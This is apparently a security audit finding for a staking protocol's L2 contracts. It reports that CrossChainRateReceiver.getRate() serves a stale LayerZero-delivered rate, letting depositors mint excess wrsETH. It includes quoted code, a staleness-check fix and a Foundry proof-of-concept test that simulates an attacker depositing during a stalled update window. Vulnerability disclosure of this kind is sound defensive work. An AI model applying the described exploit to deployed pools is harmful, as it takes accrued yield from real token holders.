### Title
Stale Rate Returned by `CrossChainRateReceiver.getRate()` Allows Excess wrsETH Minting, Stealing Yield from Existing Holders — (`contracts/cross-chain/CrossChainRateReceiver.sol`)

---

### Summary

`CrossChainRateReceiver` stores `lastUpdated` but never uses it in `getRate()`. When the LayerZero rate-update pipeline stalls (a realistic operational event), the cached `rate` becomes stale while the true L1 rsETH/ETH rate appreciates. Any depositor calling `RSETHPoolV3.deposit()` during the stale window receives more `wrsETH` than the current L1 rate justifies, diluting existing holders' accrued yield.

---

### Finding Description

`CrossChainRateReceiver.getRate()` unconditionally returns the last stored `rate`:

```solidity
// contracts/cross-chain/CrossChainRateReceiver.sol L103-105
function getRate() external view returns (uint256) {
    return rate;
}
``` [1](#0-0) 

The contract does track when the rate was last updated:

```solidity
// contracts/cross-chain/CrossChainRateReceiver.sol L16-17
uint256 public lastUpdated;
``` [2](#0-1) 

But `lastUpdated` is only written in `lzReceive()` and is never read in `getRate()` — there is no staleness guard anywhere in the contract. [3](#0-2) 

`RSETHPoolV3.getRate()` delegates directly to whatever address is stored in `rsETHOracle`, which on L2 is `RSETHRateReceiver` (a concrete deployment of `CrossChainRateReceiver`):

```solidity
// contracts/pools/RSETHPoolV3.sol L235-237
function getRate() public view returns (uint256) {
    return IOracle(rsETHOracle).getRate();
}
``` [4](#0-3) 

The stale rate flows directly into the mint calculation:

```solidity
// contracts/pools/RSETHPoolV3.sol L299-308
function viewSwapRsETHAmountAndFee(uint256 amount) public view returns (uint256 rsETHAmount, uint256 fee) {
    fee = amount * feeBps / 10_000;
    uint256 amountAfterFee = amount - fee;
    uint256 rsETHToETHrate = getRate();
    rsETHAmount = amountAfterFee * 1e18 / rsETHToETHrate;
}
``` [5](#0-4) 

And `deposit()` mints without any independent rate freshness check:

```solidity
// contracts/pools/RSETHPoolV3.sol L258-264
(uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(amount);
feeEarnedInETH += fee;
wrsETH.mint(msg.sender, rsETHAmount);
``` [6](#0-5) 

`wrsETH.mint()` in `RsETHTokenWrapper` is gated only by `MINTER_ROLE`, which `RSETHPoolV3` holds — no additional rate validation occurs there. [7](#0-6) 

---

### Impact Explanation

rsETH is a yield-bearing token: its ETH-denominated rate increases monotonically as staking rewards accrue. When the stale rate `r_stale < r_true`, the formula `rsETHAmount = ETH * 1e18 / r_stale` produces more rsETH than the depositor is entitled to at the current L1 rate. The excess represents yield that had already accrued to existing rsETH holders but is now captured by the late depositor. This is a direct, quantifiable transfer of unclaimed yield from existing holders to the attacker, matching the **High — Theft of unclaimed yield** impact scope.

---

### Likelihood Explanation

LayerZero pipeline stalls are a known operational risk: the rate provider must pay relayer/oracle fees on every update, and LZ network congestion or fee underpayment can halt delivery for hours or days. The `RSETHRateProvider` / `RSETHMultiChainRateProvider` contracts push updates on-demand; if the push fails or is delayed, the L2 receiver silently serves the old rate. No attacker action is required to cause the stall — the attacker only needs to observe that `lastUpdated` is old and then call `deposit()`. The daily mint limit (`dailyMintLimit`) caps per-day exposure but does not prevent the attack; it only bounds the magnitude per epoch. [8](#0-7) 

---

### Recommendation

Add a configurable `maxStaleness` parameter to `CrossChainRateReceiver` and revert in `getRate()` if the rate is too old:

```solidity
uint256 public maxStaleness; // e.g. 24 hours

function getRate() external view returns (uint256) {
    require(block.timestamp - lastUpdated <= maxStaleness, "Rate is stale");
    return rate;
}
```

This causes `deposit()` to revert during a stale window rather than silently minting at an incorrect rate, protecting existing holders.

---

### Proof of Concept

```solidity
// Foundry fork test (local fork, no mainnet)
function test_staleRateMintExcess() public {
    // Setup: RSETHRateReceiver as oracle for RSETHPoolV3
    // Initial rate: 1.05e18 (1 rsETH = 1.05 ETH)
    uint256 staleRate = 1.05e18;
    // Simulate lzReceive setting initial rate
    vm.prank(lzEndpoint);
    receiver.lzReceive(srcChainId, abi.encodePacked(rateProvider), 0,
                       abi.encode(staleRate));

    // Warp 7 days — LZ pipeline stalled, true L1 rate is now 1.10e18
    vm.warp(block.timestamp + 7 days);
    // (lzReceive is NOT called — rate stays at 1.05e18)

    uint256 depositAmount = 1 ether;
    uint256 trueRate = 1.10e18;

    // Attacker deposits
    vm.deal(attacker, depositAmount);
    vm.prank(attacker);
    pool.deposit{value: depositAmount}("ref");

    uint256 received = wrsETH.balanceOf(attacker);
    uint256 expectedAtTrueRate = depositAmount * 1e18 / trueRate; // ~0.909e18
    uint256 expectedAtStaleRate = depositAmount * 1e18 / staleRate; // ~0.952e18

    // Attacker received more than entitled
    assertGt(received, expectedAtTrueRate);
    assertEq(received, expectedAtStaleRate);

    // Yield stolen per ETH deposited
    uint256 yieldStolen = received - expectedAtTrueRate; // ~0.043e18 wrsETH
    assertGt(yieldStolen, 0);
}
```

### Citations

**File:** contracts/cross-chain/CrossChainRateReceiver.sol (L16-17)
```text
    uint256 public lastUpdated;

```

**File:** contracts/cross-chain/CrossChainRateReceiver.sol (L82-100)
```text
    function lzReceive(uint16 _srcChainId, bytes memory _srcAddress, uint64, bytes calldata _payload) external {
        require(msg.sender == layerZeroEndpoint, "Sender should be lz endpoint");

        address srcAddress;
        assembly {
            srcAddress := mload(add(_srcAddress, 20))
        }

        require(_srcChainId == srcChainId, "Src chainId must be correct");
        require(srcAddress == rateProvider, "Src address must be provider");

        uint256 _rate = abi.decode(_payload, (uint256));

        rate = _rate;

        lastUpdated = block.timestamp;

        emit RateUpdated(_rate);
    }
```

**File:** contracts/cross-chain/CrossChainRateReceiver.sol (L103-105)
```text
    function getRate() external view returns (uint256) {
        return rate;
    }
```

**File:** contracts/pools/RSETHPoolV3.sol (L96-125)
```text
    modifier limitDailyMint(uint256 amount, address token) {
        if (block.timestamp < startTimestamp) {
            revert MintBeforeStartTimestamp();
        }

        uint256 rsETHAmount;

        // Calculate the amount of rsETH that will be minted
        if (token == ETH_IDENTIFIER) {
            (rsETHAmount,) = viewSwapRsETHAmountAndFee(amount);
        } else {
            (rsETHAmount,) = viewSwapRsETHAmountAndFee(amount, token);
        }

        uint256 currentDay = getCurrentDay();

        // If the current day is greater than the last mint day, reset the daily mint amount
        if (currentDay > lastMintDay) {
            lastMintDay = currentDay;
            dailyMintAmount = 0;
        }

        // Check if the daily mint amount plus the amount to mint is greater than the daily mint limit
        if (dailyMintAmount + rsETHAmount > dailyMintLimit) {
            revert DailyMintLimitExceeded();
        }

        dailyMintAmount += rsETHAmount;
        _;
    }
```

**File:** contracts/pools/RSETHPoolV3.sol (L235-237)
```text
    function getRate() public view returns (uint256) {
        return IOracle(rsETHOracle).getRate();
    }
```

**File:** contracts/pools/RSETHPoolV3.sol (L258-264)
```text
        (uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(amount);

        feeEarnedInETH += fee;

        wrsETH.mint(msg.sender, rsETHAmount);

        emit SwapOccurred(msg.sender, rsETHAmount, fee, referralId);
```

**File:** contracts/pools/RSETHPoolV3.sol (L299-308)
```text
    function viewSwapRsETHAmountAndFee(uint256 amount) public view returns (uint256 rsETHAmount, uint256 fee) {
        fee = amount * feeBps / 10_000;
        uint256 amountAfterFee = amount - fee;

        // rate of rsETH in ETH
        uint256 rsETHToETHrate = getRate();

        // Calculate the final rsETH amount
        rsETHAmount = amountAfterFee * 1e18 / rsETHToETHrate;
    }
```

**File:** contracts/L2/RsETHTokenWrapper.sol (L190-192)
```text
    function mint(address _to, uint256 _amount) external onlyRole(MINTER_ROLE) {
        _mint(_to, _amount);
    }
```
